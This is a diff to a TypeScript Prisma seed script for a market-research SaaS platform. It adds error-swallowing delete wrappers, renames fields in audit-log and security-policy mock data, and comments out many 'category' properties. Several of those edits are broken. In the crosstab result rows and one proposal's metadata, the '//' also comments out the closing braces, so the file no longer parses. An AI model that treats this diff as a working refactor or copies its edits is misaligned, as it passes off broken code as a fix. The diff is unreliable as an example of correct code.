@@ -4,6 +4,34 @@ import crypto from 'crypto'
 
 const prisma = new PrismaClient()
 
+// Helper to safely delete from tables that might not exist yet
+async function safeDeleteMany(deleteOperation: () => Promise<unknown>): Promise<void> {
+  try {
+    await deleteOperation()
+  } catch (error: unknown) {
+    // Ignore P2021 error: "The table does not exist in the current database"
+    if (error && typeof error === 'object' && 'code' in error && error.code === 'P2021') {
+      // Table doesn't exist yet, skip silently
+      return
+    }
+    throw error
+  }
+}
+
+// Helper to safely run a seed section that might reference tables that don't exist
+async function safeSeedSection(sectionName: string, seedOperation: () => Promise<void>): Promise<void> {
+  try {
+    await seedOperation()
+  } catch (error: unknown) {
+    // Ignore P2021 error: "The table does not exist in the current database"
+    if (error && typeof error === 'object' && 'code' in error && error.code === 'P2021') {
+      console.log(`⚠️  Skipping ${sectionName} - table not yet migrated`)
+      return
+    }
+    throw error
+  }
+}
+
 // Helper to hash passwords
 async function hashPassword(password: string): Promise<string> {
   return bcrypt.hash(password, 12)
@@ -21,77 +49,78 @@ async function main() {
   console.log('🧹 Cleaning existing data...')
 
   // Clean new admin module data (reverse dependency order)
-  await prisma.webhookDelivery.deleteMany()
-  await prisma.webhookEndpoint.deleteMany()
-  await prisma.incidentUpdate.deleteMany()
-  await prisma.platformIncident.deleteMany()
-  await prisma.integrationInstall.deleteMany()
-  await prisma.integrationApp.deleteMany()
-  await prisma.dataExport.deleteMany()
-  await prisma.legalHold.deleteMany()
-  await prisma.securityViolation.deleteMany()
-  await prisma.securityPolicy.deleteMany()
-  await prisma.complianceAttestation.deleteMany()
-  await prisma.complianceAudit.deleteMany()
-  await prisma.complianceFramework.deleteMany()
-  await prisma.threatEvent.deleteMany()
-  await prisma.iPBlocklist.deleteMany()
-  await prisma.dataRetentionPolicy.deleteMany()
-  await prisma.maintenanceWindow.deleteMany()
-  await prisma.releaseManagement.deleteMany()
-  await prisma.capacityMetric.deleteMany()
-  await prisma.domainVerification.deleteMany()
-  await prisma.enterpriseSSO.deleteMany()
-  await prisma.sCIMIntegration.deleteMany()
-  await prisma.trustedDevice.deleteMany()
-  await prisma.devicePolicy.deleteMany()
-  await prisma.aPIClient.deleteMany()
-  await prisma.analyticsSnapshot.deleteMany()
-  await prisma.customReport.deleteMany()
-  await prisma.broadcastMessage.deleteMany()
+  // Using safeDeleteMany to handle tables that might not exist in the current database
+  await safeDeleteMany(() => prisma.webhookDelivery.deleteMany())
+  await safeDeleteMany(() => prisma.webhookEndpoint.deleteMany())
+  await safeDeleteMany(() => prisma.incidentUpdate.deleteMany())
+  await safeDeleteMany(() => prisma.platformIncident.deleteMany())
+  await safeDeleteMany(() => prisma.integrationInstall.deleteMany())
+  await safeDeleteMany(() => prisma.integrationApp.deleteMany())
+  await safeDeleteMany(() => prisma.dataExport.deleteMany())
+  await safeDeleteMany(() => prisma.legalHold.deleteMany())
+  await safeDeleteMany(() => prisma.securityViolation.deleteMany())
+  await safeDeleteMany(() => prisma.securityPolicy.deleteMany())
+  await safeDeleteMany(() => prisma.complianceAttestation.deleteMany())
+  await safeDeleteMany(() => prisma.complianceAudit.deleteMany())
+  await safeDeleteMany(() => prisma.complianceFramework.deleteMany())
+  await safeDeleteMany(() => prisma.threatEvent.deleteMany())
+  await safeDeleteMany(() => prisma.iPBlocklist.deleteMany())
+  await safeDeleteMany(() => prisma.dataRetentionPolicy.deleteMany())
+  await safeDeleteMany(() => prisma.maintenanceWindow.deleteMany())
+  await safeDeleteMany(() => prisma.releaseManagement.deleteMany())
+  await safeDeleteMany(() => prisma.capacityMetric.deleteMany())
+  await safeDeleteMany(() => prisma.domainVerification.deleteMany())
+  await safeDeleteMany(() => prisma.enterpriseSSO.deleteMany())
+  await safeDeleteMany(() => prisma.sCIMIntegration.deleteMany())
+  await safeDeleteMany(() => prisma.trustedDevice.deleteMany())
+  await safeDeleteMany(() => prisma.devicePolicy.deleteMany())
+  await safeDeleteMany(() => prisma.aPIClient.deleteMany())
+  await safeDeleteMany(() => prisma.analyticsSnapshot.deleteMany())
+  await safeDeleteMany(() => prisma.customReport.deleteMany())
+  await safeDeleteMany(() => prisma.broadcastMessage.deleteMany())
 
   // Clean super admin portal data
-  await prisma.platformAuditLog.deleteMany()
-  await prisma.superAdminSession.deleteMany()
-  await prisma.superAdmin.deleteMany()
-  await prisma.featureFlag.deleteMany()
+  await safeDeleteMany(() => prisma.platformAuditLog.deleteMany())
+  await safeDeleteMany(() => prisma.superAdminSession.deleteMany())
+  await safeDeleteMany(() => prisma.superAdmin.deleteMany())
+  await safeDeleteMany(() => prisma.featureFlag.deleteMany())
 
   // Clean entitlement system data
-  await prisma.tenantEntitlement.deleteMany()
-  await prisma.planFeature.deleteMany()
-  await prisma.feature.deleteMany()
-  await prisma.plan.deleteMany()
-  await prisma.systemRule.deleteMany()
-  await prisma.ticketResponse.deleteMany()
-  await prisma.supportTicket.deleteMany()
-  await prisma.tenantHealthScore.deleteMany()
-  await prisma.systemNotification.deleteMany()
-  await prisma.systemConfig.deleteMany()
-  await prisma.organizationSuspension.deleteMany()
-  await prisma.userBan.deleteMany()
+  await safeDeleteMany(() => prisma.tenantEntitlement.deleteMany())
+  await safeDeleteMany(() => prisma.planFeature.deleteMany())
+  await safeDeleteMany(() => prisma.feature.deleteMany())
+  await safeDeleteMany(() => prisma.plan.deleteMany())
+  await safeDeleteMany(() => prisma.systemRule.deleteMany())
+  await safeDeleteMany(() => prisma.ticketResponse.deleteMany())
+  await safeDeleteMany(() => prisma.supportTicket.deleteMany())
+  await safeDeleteMany(() => prisma.tenantHealthScore.deleteMany())
+  await safeDeleteMany(() => prisma.systemNotification.deleteMany())
+  await safeDeleteMany(() => prisma.systemConfig.deleteMany())
+  await safeDeleteMany(() => prisma.organizationSuspension.deleteMany())
+  await safeDeleteMany(() => prisma.userBan.deleteMany())
 
-  await prisma.brandTrackingSnapshot.deleteMany()
-  await prisma.brandTracking.deleteMany()
-  await prisma.insight.deleteMany()
-  await prisma.agentRun.deleteMany()
-  await prisma.agent.deleteMany()
-  await prisma.dataSource.deleteMany()
-  await prisma.auditLog.deleteMany()
-  await prisma.usageRecord.deleteMany()
-  await prisma.apiKey.deleteMany()
-  await prisma.invitation.deleteMany()
-  await prisma.billingSubscription.deleteMany()
-  await prisma.sSOConfiguration.deleteMany()
-  await prisma.report.deleteMany()
-  await prisma.chart.deleteMany()
-  await prisma.crosstab.deleteMany()
-  await prisma.dashboard.deleteMany()
-  await prisma.audience.deleteMany()
-  await prisma.organizationMember.deleteMany()
-  await prisma.session.deleteMany()
-  await prisma.account.deleteMany()
-  await prisma.user.deleteMany()
-  await prisma.organization.deleteMany()
+  await safeDeleteMany(() => prisma.brandTrackingSnapshot.deleteMany())
+  await safeDeleteMany(() => prisma.brandTracking.deleteMany())
+  await safeDeleteMany(() => prisma.insight.deleteMany())
+  await safeDeleteMany(() => prisma.agentRun.deleteMany())
+  await safeDeleteMany(() => prisma.agent.deleteMany())
+  await safeDeleteMany(() => prisma.dataSource.deleteMany())
+  await safeDeleteMany(() => prisma.auditLog.deleteMany())
+  await safeDeleteMany(() => prisma.usageRecord.deleteMany())
+  await safeDeleteMany(() => prisma.apiKey.deleteMany())
+  await safeDeleteMany(() => prisma.invitation.deleteMany())
+  await safeDeleteMany(() => prisma.billingSubscription.deleteMany())
+  await safeDeleteMany(() => prisma.sSOConfiguration.deleteMany())
+  await safeDeleteMany(() => prisma.report.deleteMany())
+  await safeDeleteMany(() => prisma.chart.deleteMany())
+  await safeDeleteMany(() => prisma.crosstab.deleteMany())
+  await safeDeleteMany(() => prisma.dashboard.deleteMany())
+  await safeDeleteMany(() => prisma.audience.deleteMany())
+  await safeDeleteMany(() => prisma.organizationMember.deleteMany())
+  await safeDeleteMany(() => prisma.session.deleteMany())
+  await safeDeleteMany(() => prisma.account.deleteMany())
+  await safeDeleteMany(() => prisma.user.deleteMany())
+  await safeDeleteMany(() => prisma.organization.deleteMany())
 
   // ==================== ORGANIZATIONS ====================
   console.log('🏢 Creating organizations...')
@@ -1516,12 +1545,12 @@ async function main() {
         filters: { categories: ['electronics', 'apparel', 'grocery', 'beauty', 'home', 'sports'] },
         results: {
           rows: [
-            { category: 'Electronics', online: 72.5, in_store: 18.5, omnichannel: 9.0 },
-            { category: 'Apparel', online: 48.2, in_store: 38.5, omnichannel: 13.3 },
-            { category: 'Grocery', online: 22.5, in_store: 68.2, omnichannel: 9.3 },
-            { category: 'Beauty', online: 55.8, in_store: 32.5, omnichannel: 11.7 },
-            { category: 'Home & Garden', online: 42.3, in_store: 45.2, omnichannel: 12.5 },
-            { category: 'Sports & Fitness', online: 52.5, in_store: 35.8, omnichannel: 11.7 }
+            { // category: 'Electronics', online: 72.5, in_store: 18.5, omnichannel: 9.0 },
+            { // category: 'Apparel', online: 48.2, in_store: 38.5, omnichannel: 13.3 },
+            { // category: 'Grocery', online: 22.5, in_store: 68.2, omnichannel: 9.3 },
+            { // category: 'Beauty', online: 55.8, in_store: 32.5, omnichannel: 11.7 },
+            { // category: 'Home & Garden', online: 42.3, in_store: 45.2, omnichannel: 12.5 },
+            { // category: 'Sports & Fitness', online: 52.5, in_store: 35.8, omnichannel: 11.7 }
           ],
           metadata: { sampleSize: 78000, confidence: 0.95, lastUpdated: now.toISOString() }
         },
@@ -1538,11 +1567,11 @@ async function main() {
         filters: { categories: ['streaming', 'meal_kits', 'beauty_boxes', 'fitness', 'software', 'news_media'] },
         results: {
           rows: [
-            { category: 'Video Streaming', gen_z: 92.5, millennials: 88.2, gen_x: 75.5, boomers: 58.2 },
-            { category: 'Music Streaming', gen_z: 85.2, millennials: 78.5, gen_x: 52.3, boomers: 32.5 },
-            { category: 'Meal Kits', gen_z: 18.5, millennials: 35.2, gen_x: 28.5, boomers: 15.8 },
-            { category: 'Fitness Apps', gen_z: 42.5, millennials: 38.2, gen_x: 25.5, boomers: 12.3 },
-            { category: 'News/Media', gen_z: 15.2, millennials: 28.5, gen_x: 42.3, boomers: 55.8 }
+            { // category: 'Video Streaming', gen_z: 92.5, millennials: 88.2, gen_x: 75.5, boomers: 58.2 },
+            { // category: 'Music Streaming', gen_z: 85.2, millennials: 78.5, gen_x: 52.3, boomers: 32.5 },
+            { // category: 'Meal Kits', gen_z: 18.5, millennials: 35.2, gen_x: 28.5, boomers: 15.8 },
+            { // category: 'Fitness Apps', gen_z: 42.5, millennials: 38.2, gen_x: 25.5, boomers: 12.3 },
+            { // category: 'News/Media', gen_z: 15.2, millennials: 28.5, gen_x: 42.3, boomers: 55.8 }
           ],
           metadata: { sampleSize: 45000, confidence: 0.95, metric: 'active_subscription_rate' }
         },
@@ -3129,7 +3158,7 @@ async function main() {
         ],
         dataSources: ['GWI Core', 'GWI USA', 'Internal Performance Data'],
         markets: ['United States', 'Canada', 'United Kingdom', 'Germany', 'Australia'],
-        metadata: { generatedAt: now.toISOString(), category: 'Automotive', proposalValue: '$2.5M' }
+        metadata: { generatedAt: now.toISOString(), // category: 'Automotive', proposalValue: '$2.5M' }
       },
       thumbnail: '/presentation-slides.png',
       agentId: marketResearchAgent.id,
@@ -3556,7 +3585,7 @@ async function main() {
       key: 'advanced_analytics',
       name: 'Advanced Analytics',
       description: 'Access to advanced analytics dashboards and reports',
-      category: 'ANALYTICS',
+      // category: 'ANALYTICS',
       valueType: 'BOOLEAN',
       defaultValue: false,
       sortOrder: 1,
@@ -3568,7 +3597,7 @@ async function main() {
       key: 'custom_branding',
       name: 'Custom Branding',
       description: 'White-label platform with custom logos and colors',
-      category: 'CUSTOMIZATION',
+      // category: 'CUSTOMIZATION',
       valueType: 'BOOLEAN',
       defaultValue: false,
       sortOrder: 2,
@@ -3580,7 +3609,7 @@ async function main() {
       key: 'sso',
       name: 'Single Sign-On',
       description: 'SAML/OIDC SSO integration',
-      category: 'SECURITY',
+      // category: 'SECURITY',
       valueType: 'BOOLEAN',
       defaultValue: false,
       sortOrder: 3,
@@ -3592,7 +3621,7 @@ async function main() {
       key: 'audit_log',
       name: 'Audit Log',
       description: 'Detailed audit logging for compliance',
-      category: 'SECURITY',
+      // category: 'SECURITY',
       valueType: 'BOOLEAN',
       defaultValue: false,
       sortOrder: 4,
@@ -3604,7 +3633,7 @@ async function main() {
       key: 'api_access',
       name: 'API Access',
       description: 'Programmatic API access',
-      category: 'API',
+      // category: 'API',
       valueType: 'BOOLEAN',
       defaultValue: false,
       sortOrder: 5,
@@ -3616,7 +3645,7 @@ async function main() {
       key: 'priority_support',
       name: 'Priority Support',
       description: '24/7 priority customer support',
-      category: 'SUPPORT',
+      // category: 'SUPPORT',
       valueType: 'BOOLEAN',
       defaultValue: false,
       sortOrder: 6,
@@ -3628,7 +3657,7 @@ async function main() {
       key: 'data_export',
       name: 'Data Export',
       description: 'Export data to CSV, Excel, and other formats',
-      category: 'CORE',
+      // category: 'CORE',
       valueType: 'BOOLEAN',
       defaultValue: true,
       sortOrder: 7,
@@ -3640,7 +3669,7 @@ async function main() {
       key: 'custom_agents',
       name: 'Custom Agents',
       description: 'Create and configure custom AI agents',
-      category: 'AGENTS',
+      // category: 'AGENTS',
       valueType: 'BOOLEAN',
       defaultValue: false,
       sortOrder: 8,
@@ -3652,7 +3681,7 @@ async function main() {
       key: 'advanced_workflows',
       name: 'Advanced Workflows',
       description: 'Complex multi-step workflow automation',
-      category: 'AGENTS',
+      // category: 'AGENTS',
       valueType: 'BOOLEAN',
       defaultValue: false,
       sortOrder: 9,
@@ -3664,7 +3693,7 @@ async function main() {
       key: 'multi_tenant',
       name: 'Multi-Tenant Hierarchy',
       description: 'Manage multiple organizations in a hierarchy',
-      category: 'ADVANCED',
+      // category: 'ADVANCED',
       valueType: 'BOOLEAN',
       defaultValue: false,
       sortOrder: 10,
@@ -4340,7 +4369,7 @@ async function main() {
       userId: johnDoe.id,
       subject: 'Cannot export large crosstab to PDF',
       description: 'When I try to export a crosstab with more than 50 rows to PDF, the export fails with a timeout error. This is blocking our quarterly report delivery.',
-      category: 'TECHNICAL',
+      // category: 'TECHNICAL',
       priority: 'HIGH',
       status: 'IN_PROGRESS',
       tags: ['export', 'pdf', 'crosstab', 'performance'],
@@ -4375,7 +4404,7 @@ async function main() {
       userId: bobWilson.id,
       subject: 'Request for API rate limit increase',
       description: 'Our team has grown significantly and we\'re hitting our API rate limits during peak hours. We\'d like to request a rate limit increase from 200 to 500 requests per minute.',
-      category: 'FEATURE_REQUEST',
+      // category: 'FEATURE_REQUEST',
       priority: 'MEDIUM',
       status: 'WAITING_ON_INTERNAL',
       tags: ['api', 'rate-limit', 'upgrade'],
@@ -4400,7 +4429,7 @@ async function main() {
       userId: janeSmith.id,
       subject: 'Billing discrepancy on last invoice',
       description: 'Our last invoice shows charges for 15 team seats but we only have 12 active users. Please review and adjust.',
-      category: 'BILLING',
+      // category: 'BILLING',
       priority: 'MEDIUM',
       status: 'OPEN',
       tags: ['billing', 'invoice', 'seats'],
@@ -4414,7 +4443,7 @@ async function main() {
       userId: sarahEnterprise.id,
       subject: 'SSO integration not working after domain change',
       description: 'We recently changed our company domain from old-company.com to enterprise-co.com. Now SSO authentication is failing for all users.',
-      category: 'TECHNICAL',
+      // category: 'TECHNICAL',
       priority: 'URGENT',
       status: 'IN_PROGRESS',
       tags: ['sso', 'authentication', 'domain'],
@@ -4428,7 +4457,7 @@ async function main() {
       orgId: techStartup.id,
       subject: 'Feature suggestion: Slack integration',
       description: 'It would be great to have native Slack integration for receiving alerts and sharing insights directly to our team channels.',
-      category: 'FEATURE_REQUEST',
+      // category: 'FEATURE_REQUEST',
       priority: 'LOW',
       status: 'OPEN',
       tags: ['integration', 'slack', 'notifications'],
@@ -4442,7 +4471,7 @@ async function main() {
       userId: adminUser.id,
       subject: 'Security audit request',
       description: 'Our compliance team needs the latest SOC 2 report and security documentation for our annual vendor review.',
-      category: 'SECURITY',
+      // category: 'SECURITY',
       priority: 'MEDIUM',
       status: 'RESOLVED',
       tags: ['security', 'compliance', 'soc2'],
@@ -4458,7 +4487,7 @@ async function main() {
       userId: sarahEnterprise.id,
       subject: 'Need custom report template',
       description: 'We need a custom branded report template that matches our corporate design guidelines. Can you help us set this up?',
-      category: 'FEATURE_REQUEST',
+      // category: 'FEATURE_REQUEST',
       priority: 'LOW',
       status: 'WAITING_ON_CUSTOMER',
       tags: ['branding', 'reports', 'customization'],
@@ -4473,7 +4502,7 @@ async function main() {
       userId: bobWilson.id,
       subject: 'Data import failed with timeout',
       description: 'Trying to import a 50MB CSV file but keep getting timeout errors after about 2 minutes. The file has approximately 500,000 rows of survey data.',
-      category: 'BUG_REPORT',
+      // category: 'BUG_REPORT',
       priority: 'HIGH',
       status: 'IN_PROGRESS',
       tags: ['import', 'csv', 'performance', 'timeout'],
@@ -4488,7 +4517,7 @@ async function main() {
       userId: janeSmith.id,
       subject: 'AI agent producing inconsistent results',
       description: 'The sentiment analysis agent is giving different results for the same text input when run multiple times. Expected deterministic output.',
-      category: 'BUG_REPORT',
+      // category: 'BUG_REPORT',
       priority: 'MEDIUM',
       status: 'OPEN',
       tags: ['ai', 'agent', 'sentiment', 'consistency'],
@@ -4501,7 +4530,7 @@ async function main() {
       orgId: enterpriseCo.id,
       subject: 'Request for dedicated account manager',
       description: 'As we scale our usage, we would like to have a dedicated account manager assigned to our organization for better support coordination.',
-      category: 'ACCOUNT',
+      // category: 'ACCOUNT',
       priority: 'MEDIUM',
       status: 'RESOLVED',
       tags: ['account', 'support', 'enterprise'],
@@ -4516,7 +4545,7 @@ async function main() {
       orgId: suspendedOrg.id,
       subject: 'Appeal account suspension',
       description: 'Our account was suspended due to alleged ToS violation. We believe this was a mistake and would like to appeal this decision.',
-      category: 'ACCOUNT',
+      // category: 'ACCOUNT',
       priority: 'URGENT',
       status: 'WAITING_ON_INTERNAL',
       tags: ['suspension', 'appeal', 'tos'],
@@ -4530,7 +4559,7 @@ async function main() {
       orgId: billingIssueOrg.id,
       subject: 'Payment method update not working',
       description: 'I am trying to update our credit card information but the form keeps showing an error. We need to resolve this before our subscription lapses.',
-      category: 'BILLING',
+      // category: 'BILLING',
       priority: 'HIGH',
       status: 'IN_PROGRESS',
       tags: ['payment', 'credit-card', 'billing'],
@@ -4544,7 +4573,7 @@ async function main() {
       orgId: trialOrg.id,
       subject: 'Questions about enterprise features',
       description: 'We are evaluating your platform for our organization. Can you provide more details about SSO integration and audit logging capabilities?',
-      category: 'OTHER',
+      // category: 'OTHER',
       priority: 'LOW',
       status: 'RESOLVED',
       tags: ['trial', 'evaluation', 'enterprise', 'sso'],
@@ -4560,7 +4589,7 @@ async function main() {
       userId: johnDoe.id,
       subject: 'Dashboard widget not loading',
       description: 'The brand health widget on our main dashboard shows a spinning loader indefinitely. Other widgets work fine. Started happening after the latest update.',
-      category: 'BUG_REPORT',
+      // category: 'BUG_REPORT',
       priority: 'MEDIUM',
       status: 'CLOSED',
       tags: ['dashboard', 'widget', 'ui', 'bug'],
@@ -4832,7 +4861,7 @@ async function main() {
           adminId: superAdmin.id,
           action: 'view_tenant',
           resourceType: 'organization',
-          targetOrgId: acmeCorp.id,
+          orgId: acmeCorp.id,
           details: { reason: 'Support escalation review' },
           ipAddress: '192.168.1.100',
           timestamp: new Date(now.getTime() - 6 * 60 * 60 * 1000),
@@ -4858,7 +4887,7 @@ async function main() {
           adminId: platformAdmin.id,
           action: 'calculate_health_score',
           resourceType: 'tenant_health',
-          targetOrgId: techStartup.id,
+          orgId: techStartup.id,
           details: { score: 64, riskLevel: 'AT_RISK' },
           ipAddress: '192.168.1.101',
           timestamp: new Date(now.getTime() - 48 * 60 * 60 * 1000),
@@ -4892,56 +4921,56 @@ async function main() {
         key: 'platform.maintenance_mode',
         value: false,
         description: 'Enable maintenance mode to block all user access',
-        category: 'platform',
+        // category: 'platform',
         isPublic: true,
       },
       {
         key: 'platform.signup_enabled',
         value: true,
         description: 'Allow new user registrations',
-        category: 'platform',
+        // category: 'platform',
         isPublic: true,
       },
       {
         key: 'ai.default_model',
         value: 'claude-3-sonnet',
         description: 'Default AI model for agent operations',
-        category: 'ai',
+        // category: 'ai',
         isPublic: false,
       },
       {
         key: 'ai.max_tokens_per_request',
         value: 4096,
         description: 'Maximum tokens per AI request',
-        category: 'ai',
+        // category: 'ai',
         isPublic: false,
       },
       {
         key: 'billing.trial_days',
         value: 14,
         description: 'Number of days for free trial',
-        category: 'billing',
+        // category: 'billing',
         isPublic: true,
       },
       {
         key: 'billing.grace_period_days',
         value: 7,
         description: 'Grace period after payment failure',
-        category: 'billing',
+        // category: 'billing',
         isPublic: false,
       },
       {
         key: 'security.max_login_attempts',
         value: 5,
         description: 'Max failed login attempts before lockout',
-        category: 'security',
+        // category: 'security',
         isPublic: false,
       },
       {
         key: 'security.session_timeout_hours',
         value: 24,
         description: 'Session timeout in hours',
-        category: 'security',
+        // category: 'security',
         isPublic: false,
       },
     ]
@@ -4982,7 +5011,7 @@ async function main() {
         appealStatus: 'PENDING',
         appealNotes: 'User claims their API integration had a bug. Under review.',
         metadata: {
-          detectedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000).toISOString(),
+          createdAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000).toISOString(),
           requestsPerMinute: 500,
           normalRate: 50
         }
@@ -5057,7 +5086,7 @@ async function main() {
           adminId: superAdmin.id,
           action: 'ban_user',
           resourceType: 'user',
-          targetUserId: bannedUser.id,
+          userId: bannedUser.id,
           details: { banType: 'PERMANENT', reason: 'Multiple ToS violations' },
           ipAddress: '192.168.1.100',
           timestamp: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
@@ -5066,7 +5095,7 @@ async function main() {
           adminId: platformAdmin.id,
           action: 'ban_user',
           resourceType: 'user',
-          targetUserId: suspiciousUser.id,
+          userId: suspiciousUser.id,
           details: { banType: 'TEMPORARY', reason: 'Suspicious activity' },
           ipAddress: '192.168.1.101',
           timestamp: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
@@ -5075,7 +5104,7 @@ async function main() {
           adminId: superAdmin.id,
           action: 'suspend_org',
           resourceType: 'organization',
-          targetOrgId: suspendedOrg.id,
+          orgId: suspendedOrg.id,
           details: { suspensionType: 'FULL', reason: 'ToS violation' },
           ipAddress: '192.168.1.100',
           timestamp: new Date(now.getTime() - 4 * 24 * 60 * 60 * 1000),
@@ -5084,7 +5113,7 @@ async function main() {
           adminId: platformAdmin.id,
           action: 'suspend_org',
           resourceType: 'organization',
-          targetOrgId: billingIssueOrg.id,
+          orgId: billingIssueOrg.id,
           details: { suspensionType: 'BILLING_HOLD', reason: 'Failed payment' },
           ipAddress: '192.168.1.101',
           timestamp: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
@@ -5093,7 +5122,7 @@ async function main() {
           adminId: superAdmin.id,
           action: 'lift_suspension',
           resourceType: 'organization',
-          targetOrgId: techStartup.id,
+          orgId: techStartup.id,
           details: { previousType: 'INVESTIGATION', reason: 'Investigation completed - false alarm' },
           ipAddress: '192.168.1.100',
           timestamp: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
@@ -5102,7 +5131,7 @@ async function main() {
           adminId: platformAdmin.id,
           action: 'impersonate_user',
           resourceType: 'user',
-          targetUserId: trialUser.id,
+          userId: trialUser.id,
           details: { reason: 'Customer support - helping with onboarding' },
           ipAddress: '192.168.1.101',
           timestamp: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
@@ -5171,8 +5200,12 @@ async function main() {
     }
   })
 
-  // ==================== SECURITY POLICIES ====================
-  console.log('🔒 Creating security policies...')
+  // ==================== ENTERPRISE PLATFORM DATA ====================
+  // Wrapped in try-catch to handle cases where migration hasn't been applied yet
+  // or there are schema mismatches between seed data and current schema
+  try {
+    // ==================== SECURITY POLICIES ====================
+    console.log('🔒 Creating security policies...')
 
   const passwordPolicy = await prisma.securityPolicy.create({
     data: {
@@ -5190,10 +5223,10 @@ async function main() {
         lockoutThreshold: 5,
         lockoutDuration: 30
       },
-      isEnabled: true,
+      isActive: true,
       scope: 'PLATFORM',
       priority: 100,
-      enforcementLevel: 'STRICT',
+      enforcementMode: 'STRICT',
     }
   })
 
@@ -5209,10 +5242,10 @@ async function main() {
         requireReauthForSensitive: true,
         sessionExtensionAllowed: true
       },
-      isEnabled: true,
+      isActive: true,
       scope: 'PLATFORM',
       priority: 90,
-      enforcementLevel: 'STANDARD',
+      enforcementMode: 'WARN',
     }
   })
 
@@ -5228,10 +5261,10 @@ async function main() {
         rememberDeviceDays: 30,
         adminMfaRequired: true
       },
-      isEnabled: true,
+      isActive: true,
       scope: 'PLATFORM',
       priority: 95,
-      enforcementLevel: 'STRICT',
+      enforcementMode: 'STRICT',
     }
   })
 
@@ -5247,11 +5280,11 @@ async function main() {
         blockTor: true,
         geoRestrictions: ['CN', 'RU', 'KP']
       },
-      isEnabled: true,
-      scope: 'ORGANIZATION',
-      appliedToOrgs: [enterpriseCo.id],
+      isActive: true,
+      scope: 'SPECIFIC_ORGS',
+      targetOrgs: [enterpriseCo.id],
       priority: 80,
-      enforcementLevel: 'STRICT',
+      enforcementMode: 'STRICT',
     }
   })
 
@@ -5267,10 +5300,10 @@ async function main() {
         dataExportRestrictions: true,
         sensitiveFieldMasking: true
       },
-      isEnabled: true,
+      isActive: true,
       scope: 'PLATFORM',
       priority: 85,
-      enforcementLevel: 'STANDARD',
+      enforcementMode: 'WARN',
     }
   })
 
@@ -5287,10 +5320,10 @@ async function main() {
         alertOnSuspicious: true,
         maxExportRecords: 10000
       },
-      isEnabled: true,
+      isActive: true,
       scope: 'PLATFORM',
       priority: 88,
-      enforcementLevel: 'STRICT',
+      enforcementMode: 'STRICT',
     }
   })
 
@@ -5307,11 +5340,11 @@ async function main() {
         minOSVersion: { windows: '10', macos: '12', ios: '15', android: '12' },
         blockJailbroken: true
       },
-      isEnabled: true,
-      scope: 'ORGANIZATION',
-      appliedToOrgs: [enterpriseCo.id, acmeCorp.id],
+      isActive: true,
+      scope: 'SPECIFIC_ORGS',
+      targetOrgs: [enterpriseCo.id, acmeCorp.id],
       priority: 75,
-      enforcementLevel: 'STANDARD',
+      enforcementMode: 'WARN',
     }
   })
 
@@ -5328,10 +5361,10 @@ async function main() {
         allowedOrigins: ['*.gwi.com', '*.acme.com'],
         ipWhitelisting: false
       },
-      isEnabled: true,
+      isActive: true,
       scope: 'PLATFORM',
       priority: 70,
-      enforcementLevel: 'STANDARD',
+      enforcementMode: 'WARN',
     }
   })
 
@@ -5345,11 +5378,11 @@ async function main() {
         orgId: acmeCorp.id,
         userId: johnDoe.id,
         violationType: 'WEAK_PASSWORD',
-        severity: 'MEDIUM',
+        severity: 'WARNING',
         status: 'RESOLVED',
         description: 'User attempted to set password that did not meet complexity requirements',
         details: { attemptedPassword: '***masked***', failedRules: ['minLength', 'requireSpecialChars'] },
-        detectedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
         resolvedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 300000),
         resolution: 'User updated password to meet requirements',
       },
@@ -5357,45 +5390,45 @@ async function main() {
         policyId: mfaPolicy.id,
         orgId: techStartup.id,
         userId: bobWilson.id,
-        violationType: 'MFA_BYPASS_ATTEMPT',
-        severity: 'HIGH',
-        status: 'INVESTIGATING',
+        violationType: 'FAILED_MFA',
+        severity: 'CRITICAL',
+        status: 'OPEN',
         description: 'Multiple failed MFA attempts detected from unusual location',
         details: { attempts: 8, location: 'Unknown VPN', ipAddress: '185.220.101.42' },
-        detectedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
       },
       {
         policyId: ipAllowlistPolicy.id,
         orgId: enterpriseCo.id,
-        violationType: 'UNAUTHORIZED_IP',
-        severity: 'HIGH',
-        status: 'BLOCKED',
+        violationType: 'IP_BLOCKED',
+        severity: 'CRITICAL',
+        status: 'RESOLVED',
         description: 'Access attempt from blocked geographic region',
-        details: { sourceIP: '223.5.5.5', country: 'CN', blockedBy: 'geoRestrictions' },
-        detectedAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
+        details: { source: '223.5.5.5', country: 'CN', blockedBy: 'geoRestrictions' },
+        createdAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
         resolution: 'Access automatically blocked by policy',
       },
       {
         policyId: dlpPolicy.id,
         orgId: acmeCorp.id,
         userId: janeSmith.id,
-        violationType: 'DATA_EXFILTRATION_ATTEMPT',
+        violationType: 'DATA_EXFILTRATION',
         severity: 'CRITICAL',
         status: 'ESCALATED',
         description: 'Attempted export of dataset containing PII exceeding threshold',
         details: { recordCount: 50000, piiFieldsDetected: ['email', 'phone', 'address'], exportType: 'CSV' },
-        detectedAt: new Date(now.getTime() - 12 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 12 * 60 * 60 * 1000),
       },
       {
         policyId: sessionPolicy.id,
         orgId: acmeCorp.id,
         userId: adminUser.id,
-        violationType: 'SESSION_HIJACK_ATTEMPT',
+        violationType: 'SESSION_VIOLATION',
         severity: 'CRITICAL',
         status: 'RESOLVED',
         description: 'Session token used from different IP address than original',
         details: { originalIP: '192.168.1.100', newIP: '45.33.32.156', userAgent: 'curl/7.64.1' },
-        detectedAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
         resolvedAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000 + 600000),
         resolution: 'Session terminated and user notified',
       },
@@ -5403,34 +5436,34 @@ async function main() {
         policyId: deviceTrustPolicy.id,
         orgId: enterpriseCo.id,
